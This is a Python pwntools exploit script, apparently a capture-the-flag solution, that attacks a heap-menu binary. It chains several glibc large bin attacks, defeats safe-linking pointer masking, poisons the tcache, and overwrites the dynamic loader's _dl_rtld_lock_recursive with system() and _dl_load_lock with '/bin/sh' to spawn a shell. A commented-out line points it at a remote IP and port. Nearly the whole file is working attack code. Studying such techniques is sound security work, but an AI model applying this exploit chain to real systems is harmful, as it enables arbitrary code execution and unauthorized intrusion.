#!/usr/bin/env python3

from pwn import *

exe = ELF("./a.out", checksec=0)
libc = ELF("./libc.so.6", checksec=0)
ld = ELF("./ld-linux-x86-64.so.2", checksec=0)

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

r = conn()
#r = remote("13.126.21.122", 49169)

sla = lambda a,b : r.sendlineafter(a,b)
sa  = lambda a,b : r.sendafter(a,b)

def alloc(index, size, data=""):
    r.recv()
    r.sendline("1")
    sla("index: ", str(index))
    sla("size: ", str(size))
    if data:
        sa("input: ", data)
    else:
        sla("input: ", "")

def mask(heap_base, target):
    return target ^ (heap_base >> 0xc)

# To be able to edit 
# The size should be higher than 0x40F
def edit(index, data):
    r.recv()
    r.sendline("2")
    sla("index: ", str(index))
    sa("input: ", data)
	
# The size of the chunk should be higher than 0x40F
def show(index):
    r.recv()
    r.sendline("3")
    sla("index: ", str(index))

def free(index):
    r.recv()
    r.sendline("4")
    sla("index: ", str(index))

def defu(p):
	d = 0
	for i in range(0x100,0,-4):
		pa = (p & (0xf << i )) >> i
		pb = (d & (0xf << i+12 )) >> i+12
		d |= (pa ^ pb) << i
	return d

def main():
    r.recv()
    r.sendline("10")
    #for i in range(5):
    #    r.recvline()
    main = u64(r.recvline().strip().ljust(8, p8(0)))
    exe.address = main - 0x12f9
    log.warn("main @ 0x%x", main)
    
    # Large bin attack to overwrite the flags, make some freed chunks looks alive.
    # Just to have libc leak.

    alloc(0, 0x428)
    alloc(1, 0x28)
    alloc(2, 0x418)
    alloc(3, 0x28)

    free(0)
    alloc(4, 0x438)

    free(2)
    target = exe.address + 0x5148
    edit(0, p64(0)*3 + p64(target-0x20))
    alloc(4, 0x438)

    show(2)
    r.recvuntil("data: ")
    LIBC_LEAK = u64(r.recvline().strip().ljust(8, p8(0)))
    log.warn("Libc leak @ 0x%x", LIBC_LEAK)
    libc.address = LIBC_LEAK - libc.sym['main_arena'] - 1104
    log.warn("Libc base @ 0x%x", libc.address)

    # Targets to overwrite
    # _dl_rtld_lock_recursive -> system() && _dl_load_lock = /bin/sh

    _dl_rtld_lock_recursive = libc.address + 0x21bfc8 - 0x8 # -0x8 for alignement
    _dl_load_lock = libc.address + 0x21b9c8
    
    # Prepare tcache dup for _dl_rtld_lock_recursive

    alloc(5, 0x28)

    alloc(6, 0x48)
    alloc(0, 0x48)

    free(0)
    free(6)

    pause()
    free_flag = exe.address + 0x5158
    sizes = exe.address + 0x5118

    # Another Large bin attack.
    # Change the sizes to bigger ones.
    # So we can edit tcache chunk, and leak heap.

    alloc(8, 0x528)
    alloc(9, 0x500)

    alloc(10, 0x518)
    alloc(11, 0x500)

    free(8)
    alloc(12, 0x538)
    free(10)
    edit(8, p64(0)*3 + p64(sizes - 0x20+0x3))
    alloc(13, 0x538)
   
    # Another large bin attack lol.
    # This one to change the free bits.
    # Make the tcache chunks alive again.
	
    alloc(14, 0x628)
    alloc(15, 0x600)

    alloc(0, 0x618)
    alloc(1, 0x600)

    free(14)
    alloc(2, 0x638)
    free(0)
    edit(14, p64(0)*3 + p64(free_flag-0x20))
    alloc(3, 0x638)

    show(6)
    #####
    r.recvuntil("data: ")
    leak = u64(r.recv(6).ljust(8, p8(0)))
    defuscated =  defu(leak) 
    heap_base =defuscated - 0x7a0
    log.info("defuscated @ 0x%x", defuscated)
    log.warn("heap base @ 0x%x", heap_base)
    
    pause()
    edit(6, p64(mask(heap_base+0x750, _dl_rtld_lock_recursive)))
    alloc(0, 0x48)
    alloc(0, 0x48, p64(0) + p64(libc.sym['system']))
    
    # use /bin/sh. as the libc is patched and only /bin/ls found.
    alloc(10, 0x68)
    alloc(0, 0x68) 
    free(0)
    free(10)
    
    flag_10 = exe.address + 0x5168

    # Doing large bin so we can edit the tcache chunks.
    alloc(0, 0x728)
    alloc(1, 0x700)

    alloc(2, 0x718)
    alloc(3, 0x700)

    free(0)
    alloc(1, 0x738)
    free(2)

    edit(0, p64(0)*3 + p64(flag_10-0x20))
    alloc(0, 0x738)

    # Now the last large bin attack to make the size
    # of chunk 10 bigger.
    
    size_10 = exe.address + 0x5128 + 0x3
    alloc(0, 0x828)
    alloc(1, 0x800)

    alloc(2, 0x818)
    alloc(3, 0x800)

    free(0)
    alloc(1, 0x838)
    free(2)

    edit(0, p64(0)*3 + p64(size_10-0x20))
    alloc(0, 0x738)
    
    edit(10, p64(mask(heap_base+0x7f0, _dl_load_lock-0x8)))
    alloc(0, 0x68)
    alloc(0, 0x68, "/bin/sh\x00"*2)
    
    # Trigger
    #pause()
    r.recv()
    r.sendline("1")
    r.sendline("100")

    r.interactive()


if __name__ == "__main__":
    main()
